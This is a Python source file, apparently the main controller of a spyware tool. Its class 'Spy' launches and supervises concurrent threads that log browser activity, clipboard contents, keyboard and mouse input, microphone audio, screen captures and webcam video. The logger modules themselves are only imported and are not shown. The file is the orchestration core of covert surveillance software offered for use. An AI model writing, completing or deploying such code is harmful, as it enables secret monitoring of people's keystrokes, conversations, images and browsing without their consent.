from threading import Thread
from time import sleep
from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.screen_logger import ScreenLogger
from loggers.webcam_logger import WebcamLogger
from utils.utils import create_log_directories
from config import LOGS_DIRECTORY_PATH

class Spy:
    def __init__(self):
        self.logs_directory_path = LOGS_DIRECTORY_PATH if LOGS_DIRECTORY_PATH else ""
        self.loggers = []
        self.threads = []

    def start_all(self):
        for thread in self.threads:
            thread.start()

    def stop_all(self):
        print("Stopping threads. This might take a minute.")
        for logger in self.loggers:
            logger.running = False
            print(f"Logger {logger} stopped running..")
        for thread in self.threads:
            thread.join()
            print(f"Thread {thread.name} joined.")
    
    def check_threads(self):
        self.threads = [thread for thread in self.threads if thread.is_alive()]

    def spy(self):
        create_log_directories(self.logs_directory_path)

        browser_logger = BrowserLogger()
        clipboard_logger = ClipboardLogger()
        input_logger = InputLogger()
        microphone_logger = MicrophoneLogger()
        screen_logger = ScreenLogger()
        webcam_logger = WebcamLogger()

        self.loggers.extend([
            browser_logger,
            clipboard_logger,
            input_logger,
            microphone_logger,
            screen_logger,
            webcam_logger
        ])
        
        browser_thread = Thread(target=browser_logger.run, name="browser")
        clipboard_thread = Thread(target=clipboard_logger.run, name="clipboard")
        input_thread = Thread(target=input_logger.run, name="input")
        microphone_thread = Thread(target=microphone_logger.run, name="microphone")
        screen_thread = Thread(target=screen_logger.run, name="screen")
        webcam_thread = Thread(target=webcam_logger.run, name="webcam")

        self.threads.extend([
            browser_thread,
            clipboard_thread,
            input_thread,
            microphone_thread,
            screen_thread,
            webcam_thread,
        ])

        self.start_all()

        while True:
            sleep(5)
            self.check_threads()
            print("Currently running threads:")
            for thread in self.threads:
                print(thread.name)

if __name__ == "__main__":
    spy = Spy()
    spy.spy()
